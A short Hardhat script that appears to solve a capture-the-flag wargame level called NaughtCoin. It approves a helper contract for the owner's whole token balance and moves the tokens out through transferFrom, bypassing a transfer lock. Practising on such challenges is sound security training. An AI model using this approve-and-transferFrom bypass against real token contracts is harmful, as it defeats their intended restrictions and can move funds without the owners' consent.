const hre = require("hardhat");
const deploy = require("./deploy").deploy
const ethers = hre.ethers;

require('dotenv').config()

async function main() {

  const [owner] = await ethers.getSigners()

  const nc = await ethers.getContractAt("NaughtCoin", process.env.NC)

  const naughty = hre.network.name == "hardhat"
    ? await deploy()
    : await ethers.getContractAt("Naughty", process.env.NAUGHTY);

  const balance = await nc.balanceOf(owner.address)

  console.log(`Balance before: ${balance}`);

  await nc.approve(naughty.address, balance)

  const tx = await naughty.getCoins(nc.address, owner.address, balance, {
    gasLimit: 1e5
  })

  await tx.wait()

  console.log(`Balance after: ${await nc.balanceOf(owner.address)}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
